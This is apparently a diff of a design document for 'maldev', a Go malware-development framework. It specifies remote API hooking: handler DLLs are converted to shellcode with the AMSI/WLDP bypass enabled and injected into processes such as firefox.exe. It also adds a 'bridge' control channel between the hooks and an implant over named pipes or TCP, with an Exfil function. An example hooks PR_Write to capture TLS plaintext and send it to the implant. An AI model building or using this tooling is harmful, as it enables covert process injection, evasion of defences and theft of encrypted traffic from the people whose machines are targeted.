@@ -293,8 +293,8 @@ Each shellcode is a pre-assembled x64 byte sequence with sentinel placeholders:
 
 Allow writing remote hook handlers as normal Go code (a DLL with an exported
 entry point), converting them to shellcode via `pe/srdi` (go-donut), and
-injecting them into the target process. The Go handler gets the hooked
-function's arguments via a bridge mechanism.
+injecting them into the target process. The Go handler communicates with the
+implant through the bridge API.
 
 ### Flow
 
@@ -316,130 +316,39 @@ Parent Process                        Target Process
     │                                      │  3. Resolves imports
     │                                      │  4. Calls HandlerEntry
     │                                      │
-    │  [Optional: named pipe for config]   │  Handler connects to pipe
-    │  listener ◄──────────────────────────│  for args/results
+    │  bridge.Listen(transport)  ◄─────────│  bridge.Connect(transport)
+    │  Bidirectional control channel       │  Handler piloted by implant
     │                                      │
 ```
-
-### Bridge Package: `evasion/hook/bridge`
-
-The handler DLL imports `bridge` to read the hooked function's arguments.
-The bridge works via shared memory: the relay stub saves RCX/RDX/R8/R9
-into a known offset before jumping to the donut shellcode.
-
-```go
-package bridge
-
-// ArgBlock is written by the relay stub at a known address in the target process.
-// The relay saves the first 4 register args + stack args before jumping to the handler.
-type ArgBlock struct {
-    Args [18]uintptr
-    TrampolineAddr uintptr
-}
-
-// ReadArgs reads the argument block saved by the relay stub.
-// Must be called from within the hook handler running in the target process.
-func ReadArgs() *ArgBlock
-
-// CallOriginal calls the original function via the trampoline address
-// stored in the ArgBlock.
-func CallOriginal(args ...uintptr) uintptr
-```
-
-### Relay Stub Extension
-
-The relay stub for donut-based handlers is extended (vs the simple 13-byte
-absolute JMP for template shellcodes):
-
-```asm
-; Save register args to ArgBlock (allocated in target process)
-mov [argblock+0x00], rcx
-mov [argblock+0x08], rdx
-mov [argblock+0x10], r8
-mov [argblock+0x18], r9
-; Save trampoline address
-mov rax, <trampoline_addr>
-mov [argblock+0x90], rax
-; Jump to donut shellcode
-mov r10, <donut_shellcode_addr>
-jmp r10
-```
-
-~60 bytes, position-independent with sentinel placeholders.
 
 ### Helper: `hook.GoHandler`
 
 Convenience function that does the full pipeline:
 
 ```go
-// GoHandler converts a Go handler DLL to shellcode ready for RemoteInstall.
-// The DLL must export the function named by entryPoint.
-func GoHandler(dllPath string, entryPoint string) ([]byte, error) {
-    cfg := &srdi.Config{
-        Arch:   srdi.ArchX64,
-        Type:   srdi.ModuleDLL,
-        Method: entryPoint,
-        Bypass: 3, // AMSI/WLDP continue on fail
-    }
-    return srdi.ConvertFile(dllPath, cfg)
-}
-
-// GoHandlerBytes does the same from in-memory DLL bytes.
-func GoHandlerBytes(dllBytes []byte, entryPoint string) ([]byte, error) {
-    cfg := &srdi.Config{
-        Arch:   srdi.ArchX64,
-        Type:   srdi.ModuleDLL,
-        Method: entryPoint,
-        Bypass: 3,
-    }
-    return srdi.ConvertBytes(dllBytes, cfg)
-}
+func GoHandler(dllPath string, entryPoint string) ([]byte, error)
+func GoHandlerBytes(dllBytes []byte, entryPoint string) ([]byte, error)
 ```
 
-### Full Example
+Wraps `srdi.ConvertFile`/`srdi.ConvertBytes` with `ArchX64`, `ModuleDLL`,
+AMSI/WLDP bypass enabled.
 
-```go
-// === Handler DLL (separate Go module, built as c-shared) ===
-// handler/main.go
-package main
+### Relay Stub Extension
 
-import "C"
-import (
-    "github.com/oioio-space/maldev/evasion/hook/bridge"
-    "github.com/oioio-space/maldev/c2/transport/namedpipe"
-)
+The relay stub for donut-based handlers is extended to save register args:
 
-//export HandlerEntry
-func HandlerEntry() {
-    args := bridge.ReadArgs()
-    // args.Args[0] = lpFileName (for DeleteFileW)
-    
-    // Report back to implant via named pipe
-    p := namedpipe.New(`\\.\pipe\hookresults`, 5*time.Second)
-    p.Connect(context.Background())
-    fmt.Fprintf(p, "DeleteFileW called: %x\n", args.Args[0])
-    p.Close()
-    
-    // Call original
-    bridge.CallOriginal(args.Args[:]...)
-}
-
-func main() {}
-
-// === Implant (injects the handler into Firefox) ===
-// Build handler: go build -buildmode=c-shared -o handler.dll ./handler/
-shellcode, _ := hook.GoHandler("handler.dll", "HandlerEntry")
-
-hook.RemoteInstallByName("firefox.exe", "kernel32.dll", "DeleteFileW", shellcode,
-    hook.WithMethod(inject.MethodCreateRemoteThread),
-    hook.WithRemoteCaller(caller),
-)
-
-// Listen for results
-listener, _ := namedpipe.NewListener(`\\.\pipe\hookresults`)
-conn, _ := listener.Accept(ctx)
-io.Copy(os.Stdout, conn) // prints intercepted calls
+```asm
+mov [argblock+0x00], rcx
+mov [argblock+0x08], rdx
+mov [argblock+0x10], r8
+mov [argblock+0x18], r9
+mov rax, <trampoline_addr>
+mov [argblock+0x90], rax
+mov r10, <donut_shellcode_addr>
+jmp r10
 ```
+
+~60 bytes, position-independent with sentinel placeholders.
 
 ### Existing Infrastructure Used
 
@@ -448,36 +357,248 @@ io.Copy(os.Stdout, conn) // prints intercepted calls
 | `pe/srdi` | Convert Go DLL → position-independent shellcode (go-donut) |
 | `inject/` | Inject shellcode into target process (15+ methods) |
 | `process/enum` | Resolve process name → PID |
-| `c2/transport/namedpipe` | IPC between implant and handler |
-| `evasion/hook` (relay/trampoline) | Install the hook in target process |
+| `c2/transport` | Transport layer for bridge (pipe, TCP, TLS) |
+| `evasion/hook` | Install the hook in target process |
+
+## Package 8: `evasion/hook/bridge` — Hook Control API
+
+### Purpose
+
+Bidirectional control channel between a hook handler (running in the target
+process) and the implant (injecting process). Supports two modes: standalone
+(no communication, autonomous decisions) and connected (real-time control
+via pluggable transport).
+
+### Transport Interface
+
+```go
+type Transport interface {
+    io.ReadWriteCloser
+}
+
+func PipeTransport(name string) Transport
+func TCPTransport(addr string) Transport
+func FromTransport(t transport.Transport) Transport
+```
+
+Composes with the entire `c2/transport` layer (TCP, TLS, named pipe, future WinDivert).
+
+### Controller — handler side (target process)
+
+```go
+type Controller struct { ... }
+
+// Modes
+func Standalone() *Controller
+func Connect(t Transport) (*Controller, error)
+
+// Arguments
+func (c *Controller) Args() *ArgBlock
+func (c *Controller) CallOriginal(args ...uintptr) uintptr
+func (c *Controller) SetReturn(val uintptr)
+
+// Communication (no-op in Standalone mode)
+func (c *Controller) Log(format string, args ...interface{})
+func (c *Controller) Exfil(tag string, data []byte)
+func (c *Controller) Ask(tag string, data []byte) Decision
+func (c *Controller) ModifiedArgs() *ArgBlock
+func (c *Controller) Heartbeat() error
+
+// Target process memory access
+func (c *Controller) ReadMemory(addr uintptr, size int) []byte
+func (c *Controller) WriteMemory(addr uintptr, data []byte) error
+
+// Hook management from within the handler
+func (c *Controller) Unhook() error
+func (c *Controller) InstallHook(dll, fn string, handler uintptr) error
+
+func (c *Controller) Close() error
+```
+
+### ArgBlock
+
+```go
+type ArgBlock struct {
+    Args           [18]uintptr
+    TrampolineAddr uintptr
+}
+
+func (a *ArgBlock) String(i int) string          // UTF16PtrToString(Args[i])
+func (a *ArgBlock) Bytes(i int, n uint32) []byte  // read n bytes from pointer Args[i]
+func (a *ArgBlock) Int(i int) int64
+func (a *ArgBlock) NonZeroArgs() []int
+func (a *ArgBlock) NonZeroCount() int
+```
+
+### Decision type
+
+```go
+type Decision int
+
+const (
+    Allow  Decision = iota  // CallOriginal with original args
+    Block                   // SetReturn(0), no trampoline
+    Modify                  // CallOriginal with modified args from implant
+)
+```
+
+### Listener — implant side (injecting process)
+
+```go
+type Listener struct { ... }
+
+func Listen(t Transport) (*Listener, error)
+func FromListener(l transport.Listener) (*Listener, error)
+
+func (l *Listener) OnCall(handler func(Call) Decision)
+func (l *Listener) OnExfil(handler func(tag string, data []byte))
+func (l *Listener) OnLog(handler func(msg string))
+func (l *Listener) Close() error
+
+type Call struct {
+    Function string
+    Args     [18]uintptr
+}
+
+func (c Call) ArgString(i int) string
+func (c Call) ArgBytes(i int, n uint32) []byte
+func (c Call) ArgInt(i int) int64
+```
+
+### Wire Protocol
+
+Length-prefixed binary frames over the transport:
+
+```
+[4 bytes: length][1 byte: msg type][payload]
+
+Message types:
+  0x01 CALL     handler→implant  function + args
+  0x02 DECISION implant→handler  Allow/Block/Modify + optional modified args
+  0x03 LOG      handler→implant  log message
+  0x04 EXFIL    handler→implant  tag + data blob
+  0x05 HEARTBEAT bidirectional   ping/pong
+  0x06 UNHOOK   handler→implant  request unhook confirmation
+  0x07 RET      handler→implant  return value report
+```
+
+### Usage Examples
+
+#### Mode connecté — implant contrôle les décisions
+
+```go
+// === Handler DLL (target process) ===
+//export HandlerEntry
+func HandlerEntry() {
+    ctrl, _ := bridge.Connect(bridge.PipeTransport(`\\.\pipe\hookctrl`))
+    defer ctrl.Close()
+
+    args := ctrl.Args()
+    decision := ctrl.Ask("delete_file", args.Bytes(0, 520))
+
+    switch decision {
+    case bridge.Allow:
+        ctrl.CallOriginal(args.Args[:]...)
+    case bridge.Block:
+        ctrl.SetReturn(0)
+    case bridge.Modify:
+        newArgs := ctrl.ModifiedArgs()
+        ctrl.CallOriginal(newArgs.Args[:]...)
+    }
+}
+
+// === Implant (injecting process) ===
+listener, _ := bridge.Listen(bridge.PipeTransport(`\\.\pipe\hookctrl`))
+listener.OnCall(func(call bridge.Call) bridge.Decision {
+    path := call.ArgString(0)
+    log.Printf("DeleteFileW: %s", path)
+    if strings.Contains(path, "secret") {
+        return bridge.Block
+    }
+    return bridge.Allow
+})
+```
+
+#### Mode autonome — handler décide seul
+
+```go
+//export HandlerEntry
+func HandlerEntry() {
+    ctrl := bridge.Standalone()
+    args := ctrl.Args()
+    path := args.String(0)
+
+    if strings.Contains(path, "secret") {
+        ctrl.SetReturn(0) // block
+    } else {
+        ctrl.CallOriginal(args.Args[:]...) // allow
+    }
+}
+```
+
+#### Mode connecté via TCP (cross-machine)
+
+```go
+// Handler in target VM
+ctrl, _ := bridge.Connect(bridge.TCPTransport("192.168.56.1:4444"))
+
+// Implant on host machine
+listener, _ := bridge.Listen(bridge.TCPTransport(":4444"))
+```
+
+#### Exfiltration — TLS interception
+
+```go
+//export HandlerEntry
+func HandlerEntry() {
+    ctrl, _ := bridge.Connect(bridge.PipeTransport(`\\.\pipe\tlscap`))
+    defer ctrl.Close()
+
+    args := ctrl.Args()
+    // PR_Write(fd, buf, amount) — capture plaintext buffer
+    buf := args.Bytes(1, uint32(args.Int(2)))
+    ctrl.Exfil("tls_plaintext", buf)
+    ctrl.CallOriginal(args.Args[:]...)
+}
+
+// Implant
+listener.OnExfil(func(tag string, data []byte) {
+    log.Printf("[%s] %d bytes: %s", tag, len(data), data[:min(64, len(data))])
+})
+```
 
 ## Architecture
 
 ```
-pe/imports/                     Layer 0 — pure PE analysis
+pe/imports/                         Layer 0 — pure PE analysis
     imports.go
     imports_test.go
 
-evasion/hook/                   Layer 2 — hooking engine
+evasion/hook/                       Layer 2 — hooking engine
     doc.go
-    x86len.go                   instruction decoder (existing)
-    hook_windows.go             Install/InstallByName + HookOption (modified)
-    hook_stub.go                !windows stub (modified)
-    probe_windows.go            InstallProbe/InstallProbeByName
-    group_windows.go            HookGroup + InstallAll
-    remote_windows.go           RemoteInstall/RemoteInstallByName + GoHandler
-    hook_windows_test.go        (existing + new tests)
+    x86len.go                       instruction decoder (existing)
+    hook_windows.go                 Install/InstallByName + HookOption (modified)
+    hook_stub.go                    !windows stub (modified)
+    probe_windows.go                InstallProbe/InstallProbeByName
+    group_windows.go                HookGroup + InstallAll
+    remote_windows.go               RemoteInstall/RemoteInstallByName + GoHandler
+    hook_windows_test.go            (existing + new tests)
 
-evasion/hook/bridge/            Layer 2 — cross-process arg bridge
-    bridge_windows.go           ReadArgs, CallOriginal
-    bridge_stub.go              !windows stub
+evasion/hook/bridge/                Layer 2 — hook control API
+    transport.go                    Transport interface + PipeTransport/TCPTransport/FromTransport
+    controller_windows.go           Standalone/Connect, Args, CallOriginal, Ask, Exfil, etc.
+    controller_stub.go              !windows stub
+    listener.go                     Listen, OnCall, OnExfil, OnLog
+    protocol.go                     Wire protocol: framing, message types, encode/decode
+    args.go                         ArgBlock struct + String/Bytes/Int/NonZero helpers
+    bridge_test.go
 
-evasion/hook/shellcode/         Layer 2 — shellcode templates
-    shellcode.go                Block, Nop, Replace, Redirect
-    pipe.go                     LogToPipe, CopyArg
-    file.go                     LogToFile
-    filter.go                   BlockIf
-    chain.go                    Chain
+evasion/hook/shellcode/             Layer 2 — shellcode templates
+    shellcode.go                    Block, Nop, Replace, Redirect
+    pipe.go                         LogToPipe, CopyArg
+    file.go                         LogToFile
+    filter.go                       BlockIf
+    chain.go                        Chain
     shellcode_test.go
 ```
 
@@ -485,11 +606,16 @@ evasion/hook/shellcode/         Layer 2 — shellcode templates
 
 ```
 pe/imports → debug/pe (stdlib)
+
 evasion/hook → win/api, win/syscall, evasion/unhook (for WithCleanFirst)
 evasion/hook → inject (for RemoteInstall)
 evasion/hook → process/enum (for RemoteInstallByName)
 evasion/hook → pe/srdi (for GoHandler)
-evasion/hook/bridge → win/api (for ReadArgs/CallOriginal)
+
+evasion/hook/bridge → c2/transport (for FromTransport/FromListener)
+evasion/hook/bridge → c2/transport/namedpipe (for PipeTransport)
+evasion/hook/bridge → win/api (for ReadMemory/WriteMemory)
+
 evasion/hook/shellcode → (no maldev deps, self-contained byte templates)
 ```
 
@@ -501,9 +627,11 @@ evasion/hook/shellcode → (no maldev deps, self-contained byte templates)
 - `HookGroup`: install 3 hooks, verify all called, RemoveAll restores all
 - `RemoteInstall`: inject into spawned sacrificial process (notepad), verify hook patch in target memory via `ReadProcessMemory`. Use `testutil.SpawnAndResume`.
 - `GoHandler`: build a minimal test DLL, convert via srdi, verify shellcode is non-empty
-- `bridge`: unit test ArgBlock serialization/deserialization
+- `bridge/protocol`: unit test frame encode/decode, message type round-trips
+- `bridge/controller+listener`: integration test with in-process pipe — Controller sends CALL, Listener responds with Decision, verify round-trip
+- `bridge/args`: unit test ArgBlock NonZero, String, Bytes helpers
 - Shellcodes: unit test each template (verify correct byte sequences, placeholder replacement)
-- **VM-only tests** (tagged `intrusive`): full end-to-end RemoteInstall into notepad with real hook verification
+- **VM-only tests** (tagged `intrusive`): full end-to-end RemoteInstall into notepad with real hook + bridge verification
 
 ## Limitations (documented)
 
@@ -514,4 +642,6 @@ evasion/hook/shellcode → (no maldev deps, self-contained byte templates)
 - `Chain` requires each shellcode to be position-independent
 - Don't hook Go runtime critical functions (NtClose, NtCreateFile, NtReadFile, NtWriteFile)
 - Cross-process hooking of non-system DLLs requires module enumeration to find base address
-- `bridge.ReadArgs` relies on a fixed-offset shared memory layout — relay stub and bridge must agree on the ArgBlock address
+- `bridge` relay stub and controller must agree on the ArgBlock memory layout
+- `bridge.Ask` is synchronous — blocks the hooked function until the implant responds (latency sensitive)
+- `bridge.Standalone` mode: Log/Exfil/Ask are no-ops, handler must make all decisions locally
